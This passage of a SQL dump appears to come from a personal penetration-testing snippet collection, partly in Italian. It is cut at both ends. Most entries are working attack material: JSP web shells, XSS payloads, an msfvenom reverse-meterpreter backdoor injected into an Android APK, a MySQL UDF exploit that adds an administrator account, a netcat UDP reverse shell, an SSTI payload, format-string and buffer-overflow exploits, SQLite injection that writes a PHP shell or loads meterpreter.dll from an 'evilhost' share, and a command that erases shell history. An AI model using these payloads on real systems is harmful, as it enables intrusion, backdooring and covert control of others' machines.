specify SERVER_PORT. Uncomment and edit CONNECT_BACK_HOST and CONNECT_BACK_DELAY directives if you want backconnect. Run make:\n\n	$ make linux_x64\n\nNow run ./tshd on server. It will start listening on the specified port. You can connect to it via executing the following command:\n\n	./tsh host_ip\n\nIf tsh was compiled with backconnect capability, the tshd daemon will try to connect back to the attacker\'s machine. To launch listener on attacker\'s side:\n\n	$ ./tsh cb\n	Waiting for the server to connect...\n\nTo transfer files with tsh:\n\n	./tsh host_ip get /etc/passwd .\n	./tsh host_ip put /bin/netcat /tmp'),(647,'2017-06-09 08:20:23','Elimare il comando successivo dalla history','history -d $((HISTCMD-1)) && rm -f important_file\n'),(648,'2017-06-09 08:20:23','php mysql preapred statement anti sql injection','Using MySQLi (for MySQL):\n$stmt = $dbConnection->prepare(\'SELECT * FROM employees WHERE name = ?\');\n$stmt->bind_param(\'s\', $name);\n\n$stmt->execute();\n\n$result = $stmt->get_result();\nwhile ($row = $result->fetch_assoc()) {\n    // do something with $row\n'),(649,'2017-06-09 08:20:23','JSP java shell','<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>\n'),(650,'2017-06-09 08:20:23','jsp shell','<%@ page import=\"java.util.*,java.io.*\"%>\n<HTML><BODY>\n<FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">\n<INPUT TYPE=\"text\" NAME=\"cmd\">\n<INPUT TYPE=\"submit\" VALUE=\"Send\">\n</FORM>\n<pre>\n<%\nif (request.getParameter(\"cmd\") != null) {\n        out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");\n        Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\n        OutputStream os = p.getOutputStream();\n        InputStream in = p.getInputStream();\n        DataInputStream dis = new DataInputStream(in);\n        String disr = dis.readLine();\n        while ( disr != null ) {\n                out.println(disr); \n                disr = dis.readLine(); \n                }\n        }\n%>\n</pre>\n</BODY></HTML>\n'),(651,'2017-06-09 08:20:23','jsp shell','<form method=\"GET\" action=\"\">\n	<input type=\"text\" name=\"cmd\" />\n	<input type=\"submit\" value=\"Exec!\" />\n</form> <%!\npublic String esc(String str){\n	StringBuffer sb = new StringBuffer();\n	for(char c : str.toCharArray())\n		if( c >= \'0\' && c <= \'9\' || c >= \'A\' && c <= \'Z\' || c >= \'a\' && c <= \'z\' || c == \' \' )\n			sb.append( c );\n		else\n			sb.append(\"&#\"+(int)(c&0xff)+\";\");\n	return sb.toString();\n} %><%\nString cmd = request.getParameter(\"cmd\");\nif ( cmd != null) {\n	out.println(\"<pre>Command was: <b>\"+esc(cmd)+\"</b>\\n\");\n	java.io.DataInputStream in = new java.io.DataInputStream(Runtime.getRuntime().exec(cmd).getInputStream());\n	String line = in.readLine();\n	while( line != null ){\n		out.println(esc(line));\n		line = in.readLine();\n	}\n	out.println(\"</pre>\");\n'),(652,'2017-06-09 08:20:23','file upload xss nome file','\"><img src=x onerror=alert(1)>.jpg\n'),(653,'2017-06-09 08:20:23','svg xss','<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<html xmlns=\"http://www.w3.org/1999/xhtml\"\n     xmlns:svg=\"http://www.w3.org/2000/svg\">\n<svg:g onload=\"alert(8)\"/>\n</html>\n'),(654,'2017-06-09 08:20:23','jsp shell','<%@ page import=\"java.util.*,java.io.*\" %>\n\n<HTML>\n<TITLE>Laudanum JSP Shell</TITLE>\n\n<BODY>\nCommands with JSP\n<FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">\n    <INPUT TYPE=\"text\" NAME=\"cmd\">\n    <INPUT TYPE=\"submit\" VALUE=\"Send\"><br/>\n    If you use this against a Windows box you may need to prefix your command with cmd.exe /c\n</FORM>\n<pre>\n<%\n    if (request.getParameter(\"cmd\") != null) {\n        out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");\n        Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\n        OutputStream os = p.getOutputStream();\n        InputStream in = p.getInputStream();\n        DataInputStream dis = new DataInputStream(in);\n        String disr = dis.readLine();\n        while (disr != null) {\n            out.println(disr);\n            disr = dis.readLine();\n        }\n    }\n%>\n</pre>\n<hr/>\n<address>\n    Copyright &copy; 2012, <a href=\"mailto:laudanum@secureideas.net\">Kevin Johnson</a> and the Laudanum team.<br/>\n    Written by Tim Medin.<br/>\n    Get the latest version at <a href=\"http://laudanum.secureideas.net\">laudanum.secureideas.net</a>.\n</address>\n</BODY>\n</HTML>\n'),(655,'2017-06-09 08:20:23','svg xss','<svg xmlns=\"http://www.w3.org/2000/svg\">\n   <image onload=\"alert(1)\"></image>\n   <svg onload=\"alert(2)\"></svg>\n   <script>alert(3)</script>\n   <defs onload=\"alert(4)\"></defs>\n   <g onload=\"alert(5)\">\n       <circle onload=\"alert(6)\" />\n       <text onload=\"alert(7)\"></text>\n   </g>\n</svg>\n'),(656,'2017-06-09 08:20:23','svg xss','<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>\n'),(657,'2017-06-09 08:20:23','xss content','GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;\n'),(658,'2017-06-09 08:20:23','digest auth','Hash1=MD5(username:realm:password)\n\nHash2=MD5(method:digestURI)\n\nresponse=MD5(Hash1:nonce:nonceCount:cnonce:qop:Hash2)\n'),(660,'2017-06-09 08:20:23','windows privileges escalation attraverso servizi che hanno il nome file con spazi non racchiusi tra apici ad esempio c:\\program files (x86)\\ecc...','generare un servizio malevolo, magari attraverso msfvenon, e nell\'esempio citato si potrebbe mettere l\'eseguibile nel seguente path:\nc:\\program.exe\n'),(661,'2017-06-09 08:20:23','inject meterpreter into android apk','1. generating apk\n   msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.76 LPORT=4444 R > pentestlab.apk\n\n2. usare uno dei seguenti script per effettuare l\'inject:\n   - apkinjectior\n   - Metasploit APK Embed Payload\n   - APK Payload Injectior\n   - Backdoor APK\n\nOppure generare direttamente un apk partendo da un apk valido:\nmsfvenom -x CameraSample.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.76 LPORT=4444 -o CameraSample_backdoored.apk\n'),(662,'2017-06-09 08:20:23','shell to meterpreter','use post/multi/manage/shell_to_meterpreter\n'),(663,'2017-06-09 08:20:23','shell to meterpreter','una volta ottenuta una shell si puo eseguirne l\'update con il seguente comando\n	sessions -u X\n\ndove X corrisponde al numero di sessione\n'),(664,'2017-06-09 08:20:23','windows dll Hijacking','order to search dll when program start\n\nThe directory from which the application is loaded\nC:\\Windows\\System32\nC:\\Windows\\System\nC:\\Windows\nThe current working directory\nDirectories in the system PATH environment variable\nDirectories in the user PATH environment variable\n'),(665,'2017-06-09 08:20:23','lista pacchetti installati','cat /var/log/apt/history.log |awk \'/apt[ -][get/install]/ {print $2,$3,$4}\'\n'),(666,'2017-06-09 08:20:23','css tricks','Modalita design: aprire il devTool del browser (chrome e firefox) e a console digitare document.designMode=on. E\' possibile modificare contenuti della pagina web visualizzata come se fosse un editor di testo (un cursore vi permette di inserire, copiare e incollare testo e contenuti sempre mantenendo i css della pagina). Utile per preparare prototipi per il cliente, editando testi e immagini.\n\nNascondere elementi: aprire il devTool del browser (chrome e firefox), selezionare un elemento cliccandoci sopra. Utilizzare la shortcut h per nascondere/visualizzare un tag.\n\nScreenshot elementi: Aprire il devTool di firefox, selezionare un elemento html, tasto destro > Screenshot Node. Il browser ti mette in download il .png dell\'elemento appena printato. Comodo!\n'),(667,'2017-06-09 08:20:23','java default path to inspect','WEB-INF/classes/com/company/servlets/servlet.class\n\nWEB-INF/web.xml\n\nWEB-INF/taglib.tld\n'),(668,'2017-06-09 08:20:23','cain abel cmd remota','1. recuperare user e password SMB\n2. Andare nella scheda network\n3. tasto destro su quiclist add to quicj list\n4. inserire IP vittima\n5. Cliccare sul pc omparso tasto detro connect as\n6. inserire credenziali SMB\n7. Espandere il meno del computerino\n8. Services, tasto destro, Install Abel\n9. aggiornare ed avremo la cmd remota\n'),(669,'2017-06-09 08:20:23','pack war from jsp','$ mkdir webshell\n$ cp index.jsp webshell\n$ cd webshell\n$ jar -cvf ../webshell.war *\nadded manifest\nadding: index.jsp(in = 579) (out= 351)(deflated 39%)\n'),(670,'2017-06-09 08:20:23','rimuovere linee vuote','sed -i \'/^$/d\' file.txt\n'),(685,'2017-06-09 08:20:23','pyhton shift list','def shift(l,n):\n    return itertools.islice(itertools.cycle(l),n,n+len(l))\n\n>>> list(shift([1,2,3],1))\n[2, 3, 1]\n'),(672,'2017-06-09 08:20:23','XXE xxe external exntity xml','<!DOCTYPE netspi [<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n'),(696,'2017-06-09 08:20:23','flask ssti','{{ request.environ[\'HTTP_USEFUL\'].__import__(\'subprocess\').check_output(\'id\') }}\n'),(697,'2017-06-09 08:20:23','python struct for binary exploitation','#!usr/bin/python\n \nfrom struct import pack\n \ndef p(x):\n    return pack(\'<L\', x)\n \nshellcode = \'.....\'\n \npayload = \'\'\npayload += \'\\x90\'*254       # nopsled\npayload += shellcode        # shellcode\npayload += p(0xbffff7ba)    # eip\n \nprint payload\n'),(698,'2017-06-09 08:20:23','ROP exploit keep shell open after calling it','cat <(python -c \'print \"A\"*0x6c + \"BBBB\" + \"\\xf0\\xb6\\x64\\x55\" + \"\\xfa\\x83\\x04\\x08\"*2 + \"\\x00\\x00\\x00\\x00\"\') - | ./a.out\n'),(699,'2017-06-09 08:20:23','Binary Exploitation basics','%esp points to the last thing pushed on the stack.\n%eip points to the next thing to execute.\ncall <addr> pushes the current value of %eip and changes %eip to <addr>.\nret pops the next value off the stack into %eip.\nArguments are pushed onto the stack before a function call.\nImmediately after function call, the stack looks like this:\n\n| <argument 2>     |\n| <argument 1>     |\n| <return address> | <= %esp\nInside a function, the stack looks like this:\n\n| <argument 2>       |\n| <argument 1>       |\n| <return address>   |\n| <old %ebp>         | <= %ebp\n| <local var 1>      |\n| <local var 2>      | <= %esp\nThe return value of a function is in %eax.\n\n%eax, %ecx, and %edx are caller save registers. %ebp, %ebx, %edi, and %esi are callee save registers.\n Registers you must save before you call a function are called caller save registers. Registers you must save before you can use them in a function are called callee save registers.\n'),(700,'2017-06-09 08:20:23','formatstrings direct parameter access','./program AAAABBBB-%x-%x-%x-%x-%x\nAAAABBBB-bffff4f6-1-b7eb8f62-41414141-42424242\n./prgoram AAAABBBB-%4\\$x\nAAAABBBB-41414141\n'),(701,'2017-06-09 08:20:23','print global offset table GOT','objdump -R program\n'),(702,'2017-06-09 08:20:23','ROP exploit keep session open',' (python -c \"print \'a\' *280+ \'\\x9d\\x06\\x40\\x00\\x00\\x00\'\";cat) | ./vuln\n'),(703,'2017-06-09 08:20:23','Fixing gcc fatal error: sys/cdefs.h: No such file or directory on Ubuntu','sudo apt-get update\nsudo apt-get install g++-multilib\n'),(704,'2017-06-09 08:20:23','compiling 32 bit binary senza protezioni','gcc -m32 -o nome -fno-stack-protector -zexecstack nome.c\r\n\r\necho 0 | tee /proc/sys/kernel/randomize_va_space'),(705,'2017-06-09 08:20:23','gdb pass arguments to scanf inside gdb','python -c \'print \"A\"*1000 + \"BBBB\"\' | ./vuln\n'),(707,'2017-06-09 08:20:23','BINARY EXPLOTATION TIPS TRICKS','ROP exploit keep shell open after calling it\r\ncat <(python -c \'print \"A\"*0x6c + \"BBBB\" + \"\\xf0\\xb6\\x64\\x55\" + \"\\xfa\\x83\\x04\\x08\"*2 + \"\\x00\\x00\\x00\\x00\"\') - | ./a.out\r\n\r\n\r\nROP exploit keep session open\r\n(python -c \"print \'a\' *280+ \'\\x9d\\x06\\x40\\x00\\x00\\x00\'\";cat) | ./vuln\r\noppure\r\n(python -c \'import struct; print \"A\"*28 + struct.pack(\"I\", 0x080484cb)\'; cat -) | ./vuln\r\n\r\n\r\ncompiling 32 bit binary senza protezioni\r\ngcc -m32 -o nome -fno-stack-protector -zexecstack nome.c\r\necho 0 | tee /proc/sys/kernel/randomize_va_space\r\n\r\n\r\npython struct for binary exploitation\r\n#!usr/bin/python\r\nfrom struct import pack\r\ndef p(x):\r\n    return pack(\'<L\', x)\r\nshellcode = \'.....\'\r\npayload = \'\'\r\npayload += \'\\x90\'*254       # nopsled\r\npayload += shellcode        # shellcode\r\npayload += p(0xbffff7ba)    # eip\r\nprint payload\r\n\r\n\r\ngdb pass arguments to scanf inside gdb\r\npython -c \'print \"A\"*1000 + \"BBBB\"\' | ./vuln\r\n\r\n\r\nTrovare indirizzo funzione\r\nobjdump -d vuln2 |grep give_shell\r\n\r\n\r\nVerifica permessi stack\r\n./vuln &\r\ncat /proc/<PID>/maps\r\n\r\n\r\nLeggere valore in EIP\r\npython -c \'print \"A\"*1000 + \"BBBB\"\' | ./vuln\r\ndmesg |tail -n 1\r\n\r\n\r\nDisable ASLR Temporary\r\nsudo sysctl -w kernel.randomize_va_space=0\r\n\r\n\r\nAllow ptrace processes\r\nsudo sysctl -w kernel.yama.ptrace_scope=0'),(708,'2017-06-09 08:20:23','Binary exploitation skeleton','#!/usr/bin/python\nfrom pwn import *\ndef main():\n    # Start the process\n    p = process(\"../build/1_staticnx\")\n    # Craft the payload\n    payload = \"A\"*148 + p32(0xdeadc0de)\n    payload = payload.ljust(1000, \"\\x00\")\n    # Print the process id\n    raw_input(str(p.proc.pid))\n    # Send the payload\n    p.send(payload)\n    # Transfer interaction to the user\n    p.interactive()\nif __name__ == \'__main__\':\n    main()\n'),(709,'2017-06-09 08:20:23','format string exploitation','1. trovare quale parametro viene scritto nello stack:\n	AAAA%x%x%x%x\n%x tante volte fino a quando non vedo quale parametro scrive nello stack quindi fin quando non vedo 414141\n\n2. trovare l\'indirizzo che ci serve sovrascrivere (puo essere nella goat, una variabile o qualsiasi cosa vogliamo sovrascrivere) in questo esempio il valore check all\'indirizzo 0xbffffb28\n\n3. sapere cosa vogliamo scrivere in quell\'inidirizzo :) (in questo caso 0xdeadbeef)\n\n4. Una volta determinato il numero di parametro che scrive nello stack (in questo caso il 9) sostituire il %x con il %n che effettua la scrittura \n\n5. Costruire la prima parte dell\'indirizzo partendo dai byte meno significativi quindi in questo caso beef\n\n6. calcolare il valore decimale di beef e sottrarre il numero di byte relativo alla lunghezza della format string (aggiustare un po in base ai risultati)\n$(python -c\'print \"\\x28\\xfb\\xff\\xbf\"\')%x%x%x%x%x%x%x%48832x%hn\n\n7. ora che la parte finale (beef) è scritta, aggiungere la prima parte ricondandosi che stiamo scrivendo due byte alla volta (%hn), altrimenti si puo fare un byte alla volta usando solo %n.\nSe si usano due byte alla volta bisogna passare i due indirizzi distanti 2 byte, altrimenti passare 4 indirizzi distanti un byte uno dall\'altro\n\n$(python -c\'print \"\\x28\\xfb\\xff\\xbfJUNK\\x2a\\xfb\\xff\\xbf\"\')%x%x%x%x%x%x%x%48832x%hn\n\nSI mette JUNK che sono 4 byte per padding (cosniderare che al valore decimale saranno da aggiungere 4 byte)\n\n8. Costruire l\'ultima parte dell\'indirizzo (dead) sottraendo la prima parte (dead) alla seconda (beef)\ndead-beef = 1FBE = 8126\n\nNB: se la sottrazione da valore negativo, si aggiunge un 1 davanti al rpimo numero per dare risultato poisitivo\n\n9. Testare il tutto e nel caso aaggiustare un po\n$(python -c\'print \"\\x28\\xfb\\xff\\xbfJUNK\\x2a\\xfb\\xff\\xbf\"\')%x%x%x%x%x%x%x%48832x%hn%8126x%hn\n'),(710,'2017-06-09 08:20:23','bash convert hex ti ascii','#!/bin/bash\nfor c in $1; do\n    echo $c | xxd -r\n    echo \"\"\ndone\n'),(711,'2017-06-09 08:20:23','binary exploitation buffer overflow objdump dump one variable','objdump -t format1 |grep target\n'),(712,'2017-06-09 08:20:23','calculate pattern offset oneline','pattern offset $(echo 0x`dmesg |tail -n1 |awk \'{print $6}\'` |xxd -r |rev)\n'),(713,'2017-06-09 08:20:23','testssl docker - https://github.com/MatthewVance/testssl-docker','Standard usage\n\n$ docker run -t --rm mvance/testssl:2.8 <options>\n\nInteractive shell\n\n$ docker run -i --entrypoint /bin/bash -t --rm mvance/testssl:2.8\n\nView help\n\n$ docker run -t --rm mvance/testssl:2.8\n'),(714,'2017-06-09 08:20:23','powershell MS16-032 double logon','call powershell with -exec bypass\nImport-Module .\\1.ps1\nInvoke-MS16-032\n'),(715,'2017-06-09 08:20:23','MS16-032 custom payload instead of cmd.exe','# LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED\n$CallResult = [Advapi32]::CreateProcessWithLogonW(\n\"user\", \"domain\", \"pass\",\n0x00000002, \"C:\\pentestlab2.exe\", \"\",\n0x00000004, $null, $GetCurrentPath,\n[ref]$StartupInfo, [ref]$ProcessInfo)\n'),(716,'2017-06-09 08:20:23','bettercap error','gem uninstall packetfu\ngem install packetfu -v 1.1.11\n'),(717,'2017-06-09 08:20:23','powershell commandline ms16-032','powershell -command \"import-module .\\1.ps1; invoke-ms16-032\"\n'),(718,'2017-06-09 08:20:23','suid helper','#include <unistd.h>\n#include <err.h>\n#include <stdio.h>\n#include <sys/types.h>\n\nint main(void) {\n	if (setuid(0) || setgid(0))\n		err(1, \"setuid/setgid\");\n	fputs(\"we have root privs now...\\n\", stderr);\n	execl(\"/bin/bash\", \"bash\", NULL);\n	err(1, \"execl\");\n}\n'),(719,'2017-06-09 08:20:23','php download file wget','file_put_contents(\"Tmpfile.zip\", fopen(\"http://someurl/file.zip\", \'r\'));\n'),(720,'2017-06-09 08:20:23','mysql udf exploit','USE mysql;\nCREATE TABLE npn(line blob);\nINSERT INTO npn values(load_file(\'C://xampplite//htdocs//mail//lib_mysqludf_sys.dll\'));\nSELECT * FROM mysql.npn INTO DUMPFILE \'c://windows//system32//lib_mysqludf_sys_32.dll\';\nCREATE FUNCTION sys_exec RETURNS integer SONAME \'lib_mysqludf_sys_32.dll\';\nSELECT sys_exec(\"net user npn npn12345678 /add\");\nSELECT sys_exec(\"net localgroup Administrators npn /add\");\n'),(721,'2017-06-09 08:20:23','windows trovare file scrivibili','dir /a-r-d /s /b\n'),(722,'2017-06-09 08:20:23','aslr bypass 32 bit','while true; do ovrflow $(cat input); done\n'),(723,'2017-06-09 08:20:23','sed sostituisci spazi con a capo','sed -e \'s/\\s\\+/\\n/g\'\n'),(724,'2017-06-09 08:20:23','detect joomla version','Joomla 1.0.x sites will have the following:\n\nmeta name=Generator content=Joomla - Copyright 2005 - 2007 Open Source Matters. \n\n\nJoomla 1.5\n OpenID icon style \nand in templates\\system\\css\\template.css file you should find this:\n\n copyright Copyright  2005 – 2010 Open Source Matters.\n\nin newer versions of Joomla this file no longer exists\n\n\nBy default, all Joomla 1.5.x sites will have the following in the head of their site:\nmeta name=generator content=Joomla 1.5 - Open Source Content Management \n\n\nJoomla 1.6\n version Id: system.css 20196 2011-01-09 02:40:25Z ian \n\n\nJoomla 1.7\n version Id: system.css 21322 2011-05-11 01:10:29Z dextercowley \n\n\nJoomla 2.5\n copyright Copyright  2005 – 2012 Open Source Matters\n\n\n\nAnother way its to compare MooTools JavaScript Framework versions using a mediasystemjsmootools-more.js file:\n\nJoomla 1.5	MooTools=version:1.12  media\\system\\js\\mootools.js\nJoomla 1.6	MooTools.More=version:1.3.0.1\nJoomla 1.7	MooTools.More=version:1.3.2.1\nJoomla 2.5.6	MooTools.More=version:1.4.0.1\nJoomla 3.0 alpha 2	MooTools.More=version:1.4.0.1\n\n\nAnother way to check with Joomla 1.6 or Joomla 1.7.x website is based on its to compare date in language file: languageen-GBen-GB.ini\nJoomla 1.5.26	 Id: en-GB.ini 11391 2009-01-04 13:35:50Z ian \nJoomla 1.6.0	 Id: en-GB.ini 20196 2011-01-09 02:40:25Z ian \nJoomla 1.6.5	 Id: en-GB.ini 20990 2011-03-18 16:42:30Z infograf768 \nJoomla 1.7.1	 Id: en-GB.ini 20990 2011-03-18 16:42:30Z infograf768 \nJoomla 1.7.3	 Id: en-GB.ini 22183 2011-09-30 09:04:32Z infograf768 \nJoomla 1.7.5	 Id: en-GB.ini 22183 2011-09-30 09:04:32Z infograf768 \nfrom Joomla 2.5.0 to Joomla 2.5.4	\nversion2.5.0version\n\nyoull will see in languageen-GBen-GB.xml file.\n\nJoomla 2.5.5 Joomla 2.5.6	\nversion2.5.5version\n\nyoull will see in languageen-GBen-GB.xml file.\n'),(725,'2017-06-09 08:20:23','python udp shell','import subprocess;r=subprocess.check_output(\"/usr/bin/mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc -ulp 9999 >/tmp/f\",shell=True);print r\n'),(726,'2017-06-09 08:20:23','python udp file trasnfer','# ----- sender.py ------\n\n#!/usr/bin/env python\n\nfrom socket import *\nimport sys\n\ns = socket(AF_INET,SOCK_DGRAM)\nhost =sys.argv[1]\nport = 9999\nbuf =1024\naddr = (host,port)\n\nfile_name=sys.argv[2]\n\ns.sendto(file_name,addr)\n\nf=open(file_name,\"rb\")\ndata = f.read(buf)\nwhile (data):\n    if(s.sendto(data,addr)):\n        print \"sending ...\"\n        data = f.read(buf)\ns.close()\nf.close()\n# ----- receiver.py -----\n\n#!/usr/bin/env python\n\nfrom socket import *\nimport sys\nimport select\n\nhost=\"0.0.0.0\"\nport = 9999\ns = socket(AF_INET,SOCK_DGRAM)\ns.bind((host,port))\n\naddr = (host,port)\nbuf=1024\n\ndata,addr = s.recvfrom(buf)\nprint \"Received File:\",data.strip()\nf = open(data.strip(),\'wb\')\n\ndata,addr = s.recvfrom(buf)\ntry:\n    while(data):\n        f.write(data)\n        s.settimeout(2)\n        data,addr = s.recvfrom(buf)\nexcept timeout:\n    f.close()\n    s.close()\n    print \"File Downloaded\"\n'),(727,'2017-06-09 08:20:23','tar chown rsync etc wildcard exploit','[root@defensecode public]# ls -al\ndrwxrwxrwx. 2 user user 4096 Oct 28 19:34 .\ndrwx——. 24 user user 4096 Oct 28 18:32 ..\n-rw-r–r–. 1 leon leon 0 Oct 28 19:19 –checkpoint=1\n-rw-r–r–. 1 leon leon 0 Oct 28 19:17 –checkpoint-action=exec=sh shell.sh\n-rwxr-xr-x. 1 leon leon 12 Oct 28 19:17 shell.sh\n'),(728,'2017-06-09 08:20:23','sqlite injection','Cheat Sheet\n\n Comments	 --\n IF Statements	 CASE\n Concatenation	 ||\n Substring	 substr(x,y,z)\n Length	 length(stuff)\n Generate single quote	 select substr(quote(hex(0)),1,1);\n Generate double quote	 select cast(X\'22\' as text);\n Generate double quote (method 2)	 .. VALUES (“<?xml version=“||””””||1||\n Space-saving double quote generation	 select replace(\"<?xml version=$1.0$>\",\"$\",(select cast(X\'22\' as text)));\n\nFor some reason, 4x double quotes turns into a single double quote. Quirky, but it works.\n'),(729,'2017-06-09 08:20:23','sqlite injection Getting Shell Trick 1 - ATTACH DATABASE','What it says on the tin - lets you attach another database for your querying pleasure. Attach another known db on the filesystem that contains interesting stuff - e.g. a configuration database. Better yet - if the designated file doesn\'t exist, it will be created. You can create this file anywhere on the filesystem that you have write access to. PHP example:\n\n?id=bob\'; ATTACH DATABASE ‘/var/www/lol.php\' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES (‘<? system($_GET[‘cmd\']); ?>\';--\n\nThen of course you can just visit lol.php?cmd=id and enjoy code exec! This requires stacked queries to be a goer.\n'),(730,'2017-06-09 08:20:23','sqlite injection Getting Shell Trick 2 - SELECT load_extension','Takes two arguments:\nA library (.dll for Windows, .so for NIX)\nAn entry point (SQLITE_EXTENSION_INIT1 by default)\nThis is great because \nThis technique doesn\'t require stacked queries\nThe obvious - you can load a DLL right off the bat (meterpreter.dll? :)\n\nUnfortunately, this component of SQLite is disabled in the libraries by default. SQLite devs saw the exploitability of this and turned it off. However, some custom libraries have it enabled - for example, one of the more popular Windows ODBC drivers. To make this even better, this particular injection works with UNC paths - so you can remotely load a nasty library over SMB (provided the target server can speak SMB to the Internets). Example:\n\n?name=123 UNION SELECT 1,load_extension(\'\\\\evilhost\\evilshare\\meterpreter.dll\',\'DllMain\');--\n\nThis works wonderfully :)\n'),(731,'2017-06-09 08:20:23','sqite injection Other neat bits','If you have direct DB access, you can use PRAGMA commands to find out interesting information:\nPRAGMA database_list; -- Shows info on the attached databases, including location on the FS. e.g. 0|main|/home/vt/haxing/sqlite/how.db\nPRAGMA temp_store_directory = \'/filepath\'; -- Supposedly sets directory for temp files, but deprecated. This would\'ve been pretty sweet with the recent Android journal file permissions bug.\n'),(732,'2017-06-09 08:20:23','sqliteinjection','Integer/String based - Extract table name\n\nSELECT tbl_name FROM sqlite_master WHERE type=\'table\' and tbl_name NOT like \'sqlite_%\'\nUse limit X+1 offset X, to extract all tables.\n\nInteger/String based - Extract column name\n\nSELECT sql FROM sqlite_master WHERE type!=\'meta\' AND sql NOT NULL AND name NOT LIKE \'sqlite_%\' AND name =\'table_name\'\nFor a clean output\n\nSELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,\'(\')%2b1)),instr((substr(sql,instr(sql,\'(\')%2b1)),\'\')),\"TEXT\",\'\'),\"INTEGER\",\'\'),\"AUTOINCREMENT\",\'\'),\"PRIMARY KEY\",\'\'),\"UNIQUE\",\'\'),\"NUMERIC\",\'\'),\"REAL\",\'\'),\"BLOB\",\'\'),\"NOT NULL\",\'\'),\",\",\'~~\') FROM sqlite_master WHERE type!=\'meta\' AND sql NOT NULL AND name NOT LIKE \'sqlite_%\' AND name =\'table_name\'\nBoolean - Count number of tables\n\nand (SELECT count(tbl_name) FROM sqlite_master WHERE type=\'table\' and tbl_name NOT like \'sqlite_%\' ) < number_of_table\nBoolean - Enumerating table name\n\nand (SELECT length(tbl_name) FROM sqlite_master WHERE type=\'table\' and tbl_name not like \'sqlite_%\' limit 1 offset 0)=table_name_length_number\nBoolean - Extract info\n\nand (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type=\'table\' and tbl_name NOT like \'sqlite_%\' limit 1 offset 0) > hex(\'some_char\')\nRemote Command Execution using SQLite command - Attach Database\n\nATTACH DATABASE ‘/var/www/lol.php\' AS lol;\nCREATE TABLE lol.pwn (dataz text);\nINSERT INTO lol.pwn (dataz) VALUES (‘<?system($_GET[‘cmd\']); ?>\');--\nRemote Command Execution using SQLite command - Load_extension\n\nUNION SELECT 1,load_extension(\'\\\\evilhost\\evilshare\\meterpreter.dll\',\'DllMain\');--\n'),(733,'2017-06-09 08:20:23','sqlite command','sqlite> .help\n.auth ON|OFF           Show authorizer callbacks\n.backup ?DB? FILE      Backup DB (default \"main\") to FILE\n.bail on|off           Stop after hitting an error.  Default OFF\n.binary on|off         Turn binary output on or off.  Default OFF\n.changes on|off        Show number of rows changed by SQL\n.check GLOB            Fail if output since .testcase does not match\n.clone NEWDB           Clone data into NEWDB from the existing database\n.databases             List names and files of attached databases\n.dbinfo ?DB?           Show status information about the database\n.dump ?TABLE? ...      Dump the database in an SQL text format\n                         If TABLE specified, only dump tables matching\n                         LIKE pattern TABLE.\n.echo on|off           Turn command echo on or off\n.eqp on|off|full       Enable or disable automatic EXPLAIN QUERY PLAN\n.exit                  Exit this program\n.explain ?on|off|auto? Turn EXPLAIN output mode on or off or to automatic\n.fullschema ?--indent? Show schema and the content of sqlite_stat tables\n.headers on|off        Turn display of headers on or off\n.help                  Show this message\n.import FILE TABLE     Import data from FILE into TABLE\n.imposter INDEX TABLE  Create imposter table TABLE on index INDEX\n.indexes ?TABLE?       Show names of all indexes\n                         If TABLE specified, only show indexes for tables\n                         matching LIKE pattern TABLE.\n.iotrace FILE          Enable I/O diagnostic logging to FILE\n.limit ?LIMIT? ?VAL?   Display or change the value of an SQLITE_LIMIT\n.lint OPTIONS          Report potential schema issues. Options:\n                         fkey-indexes     Find missing foreign key indexes\n.load FILE ?ENTRY?     Load an extension library\n.log FILE|off          Turn logging on or off.  FILE can be stderr/stdout\n.mode MODE ?TABLE?     Set output mode where MODE is one of:\n                         ascii    Columns/rows delimited by 0x1F and 0x1E\n                         csv      Comma-separated values\n                         column   Left-aligned columns.  (See .width)\n                         html     HTML <table> code\n                         insert   SQL insert statements for TABLE\n                         line     One value per line\n                         list     Values delimited by \"|\"\n                         quote    Escape answers as for SQL\n                         tabs     Tab-separated values\n                         tcl      TCL list elements\n.nullvalue STRING      Use STRING in place of NULL values\n.once FILENAME         Output for the next SQL command only to FILENAME\n.open ?--new? ?FILE?   Close existing database and reopen FILE\n                         The --new starts with an empty file\n.output ?FILENAME?     Send output to FILENAME or stdout\n.print STRING...       Print literal STRING\n.prompt MAIN CONTINUE  Replace the standard prompts\n.quit                  Exit this program\n.read FILENAME         Execute SQL in FILENAME\n.restore ?DB? FILE     Restore content of DB (default \"main\") from FILE\n.save FILE             Write in-memory database into FILE\n.scanstats on|off      Turn sqlite3_stmt_scanstatus() metrics on or off\n.schema ?PATTERN?      Show the CREATE statements matching PATTERN\n                          Add --indent for pretty-printing\n.selftest ?--init?     Run tests defined in the SELFTEST table\n.separator COL ?ROW?   Change the column separator and optionally the row\n                         separator for both the output mode and .import\n.session CMD ...       Create or control sessions\n.sha3sum ?OPTIONS...?  Compute a SHA3 hash of database content\n.shell CMD ARGS...     Run CMD ARGS... in a system shell\n.show                  Show the current values for various settings\n.stats ?on|off?        Show stats or turn stats on or off\n.system CMD ARGS...    Run CMD ARGS... in a system shell\n.tables ?TABLE?        List names of tables\n                         If TABLE specified, only list tables matching\n                         LIKE pattern TABLE.\n.testcase NAME         Begin redirecting output to \'testcase-out.txt\'\n.timeout MS            Try opening locked tables for MS milliseconds\n.timer on|off          Turn SQL timer on or off\n.trace FILE|off        Output each SQL statement as it is run\n.vfsinfo ?AUX?         Information about the top-level VFS\n.vfslist               List all available VFSes\n.vfsname ?AUX?         Print the name of the VFS stack\n.width NUM1 NUM2 ...   Set column widths for \"column\" mode\n     